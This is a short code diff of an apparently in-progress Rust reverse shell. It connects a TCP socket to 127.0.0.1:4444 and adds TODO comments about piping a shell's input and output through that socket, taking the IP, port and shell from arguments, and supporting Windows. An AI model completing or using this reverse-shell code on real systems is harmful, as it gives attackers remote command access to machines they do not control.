@@ -2,7 +2,9 @@ use std::str;
 use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::process::Command;
-
+// TODO: link stdin and stdout of shell process with socket
+// TODO: cmdline args for IP PORT and SHELL
+// TODO : windows shell
 
 fn main() {
     let mut stream = TcpStream::connect("127.0.0.1:4444")
